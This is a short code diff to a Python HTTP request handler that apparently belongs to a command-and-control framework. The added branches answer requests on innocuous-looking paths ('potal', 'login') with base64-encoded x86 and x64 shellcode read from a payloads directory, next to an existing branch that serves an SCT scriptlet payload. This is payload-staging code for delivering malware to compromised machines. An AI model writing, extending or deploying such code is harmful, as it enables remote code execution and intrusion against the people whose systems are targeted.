@@ -79,6 +79,26 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           s.end_headers()
           s.wfile.write(content)
 
+        elif ("%spotal" % QuickCommandURI) in s.path:
+          filename = "%sSharp-shellcode_x86.bin" % (PayloadsDirectory)
+          with open(filename, 'rb') as f:
+            content = f.read()
+          content = base64.b64encode(content)
+          s.send_response(200)
+          s.send_header("Content-type", "text/html")
+          s.end_headers()
+          s.wfile.write(content)
+
+        elif ("%slogin" % QuickCommandURI) in s.path:
+          filename = "%sSharp-shellcode_x64.bin" % (PayloadsDirectory)
+          with open(filename, 'rb') as f:
+            content = f.read()
+          content = base64.b64encode(content)
+          s.send_response(200)
+          s.send_header("Content-type", "text/html")
+          s.end_headers()
+          s.wfile.write(content)
+
         elif ("%s_cs" % QuickCommandURI) in s.path:
           filename = "%scs_sct.xml" % (PayloadsDirectory)
           with open(filename, 'rb') as f:
